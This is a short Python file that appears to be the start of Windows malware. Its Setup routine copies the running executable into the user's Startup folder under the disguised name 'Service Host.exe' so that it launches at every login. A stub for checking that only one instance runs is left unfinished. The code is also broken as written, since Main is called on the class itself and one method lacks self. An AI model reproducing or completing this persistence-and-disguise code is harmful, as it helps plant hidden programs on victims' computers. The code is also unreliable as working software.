
import os
import sys
import shutil
import socket
import asyncio
import threading

class _:

    def __init__(self):

        self.CurrentFile = __file__

    def Setup(self):

        StartupPath = os.path.join(os.path.join(os.getenv('APPDATA'), r"Microsoft\Windows\Start Menu\Programs\Startup"), "Service Host.exe")
        
        if not os.path.exists(StartupPath):
            shutil.copy(sys.executable, StartupPath)

    def ValidateSingleProcess():
        # make it check if theres not other processes with the same name running
        pass

    def Main(self):

        self.Setup()
        self.ValidateSingleProcess()

if __name__ == "__main__":

    _.Main()